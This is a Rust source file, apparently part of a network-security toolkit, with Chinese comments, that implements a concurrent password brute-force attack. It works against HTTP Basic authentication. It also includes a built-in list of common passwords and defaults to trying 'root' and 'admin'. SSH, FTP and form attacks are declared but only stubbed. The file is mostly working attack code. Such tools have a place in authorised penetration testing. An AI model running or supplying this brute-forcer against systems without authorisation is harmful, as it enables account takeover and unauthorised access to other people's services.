// yxpil · NETON
//! 密码爆破工具
//! 支持 SSH/FTP/HTTP 基本认证暴力破解，字典攻击

use serde::{Deserialize, Serialize};
use std::time::Duration;
use tokio::sync::Semaphore;
use std::sync::Arc;

/// 爆破协议类型
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CrackProtocol {
    Ssh,
    Ftp,
    HttpBasic,
    HttpForm,
}

/// 密码爆破配置
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PasswordCrackConfig {
    /// 目标地址
    pub target: String,
    /// 目标端口
    pub port: u16,
    /// 协议类型
    pub protocol: CrackProtocol,
    /// 用户名列表
    pub usernames: Vec<String>,
    /// 密码字典
    pub passwords: Vec<String>,
    /// 并发数
    pub concurrency: usize,
    /// 超时时间（毫秒）
    pub timeout_ms: u64,
    /// 找到一个就停止
    pub stop_on_first: bool,
}

impl Default for PasswordCrackConfig {
    fn default() -> Self {
        Self {
            target: "127.0.0.1".to_string(),
            port: 22,
            protocol: CrackProtocol::Ssh,
            usernames: vec!["admin".to_string(), "root".to_string()],
            passwords: vec![],
            concurrency: 10,
            timeout_ms: 5000,
            stop_on_first: true,
        }
    }
}

/// 爆破结果条目
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CrackAttempt {
    pub username: String,
    pub password: String,
    pub success: bool,
    pub response_time_ms: u64,
    pub error: Option<String>,
}

/// 密码爆破结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PasswordCrackResult {
    pub target: String,
    pub port: u16,
    pub protocol: String,
    pub total_attempts: u32,
    pub successful: Vec<CrackAttempt>,
    pub failed: u32,
    pub duration_ms: u64,
}

/// 尝试 HTTP Basic 认证
async fn try_http_basic(
    target: &str,
    port: u16,
    username: &str,
    password: &str,
    timeout_ms: u64,
) -> Result<bool, String> {
    let url = format!("http://{}:{}/", target, port);
    let client = reqwest::Client::builder()
        .timeout(Duration::from_millis(timeout_ms))
        .build()
        .map_err(|e| e.to_string())?;

    let auth_header = format!(
        "Basic {}",
        base64::engine::general_purpose::STANDARD.encode(format!("{}:{}", username, password))
    );

    let resp = client
        .get(&url)
        .header(reqwest::header::AUTHORIZATION, auth_header)
        .send()
        .await
        .map_err(|e| e.to_string())?;

    Ok(resp.status() != reqwest::StatusCode::UNAUTHORIZED)
}

/// 执行密码爆破
pub async fn crack_passwords(config: PasswordCrackConfig) -> Result<String, String> {
    let start_time = std::time::Instant::now();
    let semaphore = Arc::new(Semaphore::new(config.concurrency));
    let mut successful: Vec<CrackAttempt> = Vec::new();
    let mut failed_count = 0u32;
    let mut total_attempts = 0u32;

    let mut handles = Vec::new();

    for username in &config.usernames {
        for password in &config.passwords {
            if config.stop_on_first && !successful.is_empty() {
                break;
            }

            let permit = semaphore
                .clone()
                .acquire_owned()
                .await
                .map_err(|e| e.to_string())?;

            let target = config.target.clone();
            let port = config.port;
            let protocol = config.protocol.clone();
            let username = username.clone();
            let password = password.clone();
            let timeout = config.timeout_ms;

            handles.push(tokio::spawn(async move {
                let _permit = permit;
                let attempt_start = std::time::Instant::now();

                let result = match protocol {
                    CrackProtocol::HttpBasic => {
                        try_http_basic(&target, port, &username, &password, timeout).await
                    }
                    CrackProtocol::Ssh | CrackProtocol::Ftp | CrackProtocol::HttpForm => {
                        // SSH/FTP/HTTP Form 爆破需要额外依赖，此处返回概念性实现
                        Err(format!(
                            "{:?} 协议爆破需要对应协议库支持（概念性实现）",
                            protocol
                        ))
                    }
                };

                let response_time = attempt_start.elapsed().as_millis() as u64;

                match result {
                    Ok(success) => CrackAttempt {
                        username,
                        password,
                        success,
                        response_time_ms: response_time,
                        error: None,
                    },
                    Err(e) => CrackAttempt {
                        username,
                        password,
                        success: false,
                        response_time_ms: response_time,
                        error: Some(e),
                    },
                }
            }));
        }
    }

    for handle in handles {
        total_attempts += 1;
        match handle.await {
            Ok(attempt) => {
                if attempt.success {
                    successful.push(attempt);
                } else {
                    failed_count += 1;
                }
            }
            Err(e) => {
                failed_count += 1;
                eprintln!("爆破任务异常: {}", e);
            }
        }
    }

    let protocol_str = match config.protocol {
        CrackProtocol::Ssh => "SSH",
        CrackProtocol::Ftp => "FTP",
        CrackProtocol::HttpBasic => "HTTP-Basic",
        CrackProtocol::HttpForm => "HTTP-Form",
    }
    .to_string();

    let result = PasswordCrackResult {
        target: config.target,
        port: config.port,
        protocol: protocol_str,
        total_attempts,
        successful,
        failed: failed_count,
        duration_ms: start_time.elapsed().as_millis() as u64,
    };

    serde_json::to_string(&crate::netsec::ToolResult::ok(result, "密码爆破完成"))
        .map_err(|e| format!("序列化失败: {}", e))
}

/// 生成常见默认密码字典
pub fn generate_common_passwords() -> Vec<String> {
    vec![
        "123456", "password", "12345678", "qwerty", "123456789",
        "12345", "1234", "111111", "1234567", "dragon",
        "123123", "baseball", "abc123", "football", "monkey",
        "letmein", "696969", "shadow", "master", "666666",
        "qwertyuiop", "123321", "mustang", "1234567890", "michael",
        "654321", "superman", "1qaz2wsx", "7777777", "fuckyou",
        "121212", "000000", "qazwsx", "123qwe", "killer",
        "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh",
        "hunter", "buster", "soccer", "harley", "batman",
        "andrew", "tigger", "sunshine", "iloveyou", "fuckme",
        "2000", "charlie", "robert", "thomas", "hockey",
        "ranger", "daniel", "starwars", "klaster", "112233",
        "george", "computer", "michelle", "jessica", "pepper",
        "1111", "zxcvbn", "555555", "11111111", "131313",
        "freedom", "777777", "passw0rd", "hello", "chicken",
        "access", "6969", "101010", "123654", "pussy",
        "matrix", "zzzzzz", "password1", "999999", "qwerty123",
    ]
    .into_iter()
    .map(|s| s.to_string())
    .collect()
}
